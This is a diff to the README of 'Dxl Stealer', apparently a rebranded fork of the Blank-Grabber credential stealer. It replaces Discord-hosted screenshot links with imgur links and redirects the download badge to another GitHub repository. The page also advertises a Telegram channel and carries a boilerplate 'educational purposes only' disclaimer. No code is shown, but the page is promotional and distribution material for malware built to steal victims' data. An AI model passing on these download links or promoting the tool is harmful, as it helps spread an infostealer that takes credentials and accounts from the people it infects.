@@ -4,7 +4,7 @@ https://t.me/dxlstealer
 </h1>
 <p align= "center">
    <kbd>
-   <img  src="https://cdn.discordapp.com/attachments/1195392912633110548/1291777575256850474/7ucTK0Gs.jpg?ex=6701551e&is=6700039e&hm=c4375c26ce46d7393cdc73f702270415458bb3f4a080c0189516b9175d9c504a&">
+   <img  src="https://imgur.com/a/OlWaOv3">
    </kbd><br><br>
    <img src="https://img.shields.io/github/languages/top/Blank-c/Blank-Grabber">
    <img src="https://img.shields.io/github/stars/Blank-c/Blank-Grabber">
@@ -54,7 +54,7 @@ Dxl
 
 ## Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-YNW/Dxl-StealerV2.0/archive/refs/heads/main.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/ghatolow/Dxl-Stealer/archive/refs/heads/main.zip)
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
@@ -101,8 +101,8 @@ Dxl
 
 <!-- Screenshots Section -->
 <h2 id="screenshots">Screenshots 📸</h2>
-<img src="https://cdn.discordapp.com/attachments/1195392912633110548/1291803240093978664/igt3sajg.jpeg?ex=67080484&is=6706b304&hm=73426c8218f6946890e1dc51be601b539ca7f0f8615f6eb9af94f0f49646d648&"Application Screenshot">
-<img src="https://cdn.discordapp.com/attachments/1195392912633110548/1291803239494451311/dm1zrMc0.jpeg?ex=67080484&is=6706b304&hm=194bb2ee091f6c561470beff1c9cf1701d64a1078f7959fde20dad131cd97e57&" alt="Application Screenshot">
+<img src="https://imgur.com/a/WZvT2fO"Application Screenshot">
+<img src="https://imgur.com/a/R74XKyM" alt="Application Screenshot">
 
 
 ## Stub Settings
